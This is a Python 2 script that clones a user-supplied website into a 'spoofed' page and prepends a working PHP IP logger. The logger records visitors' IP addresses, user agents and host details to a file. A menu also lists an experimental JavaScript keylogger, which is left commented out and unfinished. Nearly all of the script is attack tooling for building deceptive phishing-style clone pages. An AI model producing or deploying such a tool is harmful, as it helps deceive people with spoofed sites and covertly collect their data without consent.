# -*- coding: cp1252 -*-

#!/usr/bin/python
import urllib
import time
import os

# check if old file (spoofed.html) exists 
fileName = 'spoofed.html'
checkIfExist = os.path.isfile(fileName)

# create spoofed.html if not exist
if checkIfExist == 0:
    open(fileName, "w")

# delete spoofed.html if exist (has old data as backup)
if checkIfExist == 1:
    os.remove(fileName)
    
print 'Enter website url to spoof e.g (http://google.com)\n'

url = raw_input()
print "\n"

# download the website files (code for now)
os.system("cls") 
print 'Spoofing '+ url + ', this may take a few'
urllib.urlretrieve (url, fileName)

# tell the user we finished
print 'Download completed\n\n'

# store downloaded website content in spoofed.html
fileOpen = open(fileName, 'r')
fileContent = fileOpen.read()
fileOpen.close()

# choose what payloads to add to new webpage
print 'Enter corresponding key to add payload:'
print '[1] Add ip logger'
print '[2] Add JS Keylogger (EXPERMIENTAL)'
payload = raw_input()

# ip logger payload
if payload == '1':
    ipLogger = '<?php\n$file="iplog.txt";\n$f=fopen($file,"a");\nfwrite($f,"-------------------------"."\n");\nfwrite($f,"IP Address:".$_SERVER["REMOTE_ADDR"]."\n");\nfwrite($f,"User Agemt:".$_SERVER["HTTP_USER_AGENT"]."\n");\nfwrite($f,"Host Name:".php_uname("n")."\n");\nfwrite($f,"Operating System:".php_uname("v")."(".php_uname("s").")"."\n");\nfclose($f);\n?>'
    print '\nCreate new name for file: eg. (google)\n'
    newFileName = raw_input() + '.php'
    print '\nBinding an ip logger to ' + newFileName
    
    makePage = open (newFileName, 'a') ## a will append, w will over-write
    makePage.write(ipLogger)           ## write the ip logger module
    makePage.write(fileContent)		   ## write downloaded html/php code
    makePage.close()				   ## discontinue editing of file
    print '\nBound payload(s) successfully! Exiting in 4 seconds...'
    os.remove(fileName)
    time.sleep(4)					   ## give user time to read

# else
    #print 'Payload(s) failed to be bound! Exiting in 4 seconds...'
    #os.remove(fileName)
    #time.sleep(4)

# XSS/JS Keylogger + PHP
#if payload == '2':
    #newFileName = raw_input() + '.php'
    #print 'Please enter url where you will store your '+ newFileName + ' file eg.(http://mywebsite.com/' + newFileName
    #fileUrl = raw_input() + newFileName
